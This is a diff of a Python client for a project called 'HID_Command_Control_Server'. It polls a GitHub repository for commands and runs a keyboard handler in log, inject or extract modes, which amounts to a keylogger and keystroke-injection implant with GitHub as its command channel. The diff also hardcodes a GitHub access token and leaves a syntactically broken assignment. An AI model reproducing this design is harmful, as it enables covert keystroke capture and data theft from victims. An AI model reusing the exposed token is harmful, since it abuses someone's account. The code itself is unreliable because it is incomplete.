@@ -1,9 +1,9 @@
 from github_git import GitHubRepo
+from keyboard_handler import Keyboard_Handler
 
 import platform
 import sys
 import os
-
 
 def detect_os( ) -> str:
     """
@@ -26,7 +26,7 @@ def setup_communication_with_github_repo() -> GitHubRepo:
         owner = "Alishah634",
         repo = "HID_Command_Control_Server",
         # Use a classic token not a fine grained one!
-        token = "", # Hardocode belongs to Ali (BAD PRACTICE!!!)
+        token = "ghp_ynZ4QBBOANOuW4nMdd5kzGUcofwXk0tKAMq", # Hardcode belongs to Ali (BAD PRACTICE!!!)
     )
 
     # Read commits:
@@ -72,9 +72,14 @@ if __name__ == "__main__":
     # Set up connection with GitHub repo to recieve and extract commands:
     repo = setup_communication_with_github_repo()
 
+    # Set up instance of the keyhandler which handles logging, injection and extraction:
+    keyboard_handler =  
+
+
     # What mode are we in ? Log -> L, Inject -> I , Extract -> E (Default mode is Log):
     mode = "L"
     can_communicate_to_github = False
+
     # Set the check for connection to GitHub:
     while True:
         can_communicate_to_github = True if repo.can_reach_github() else False
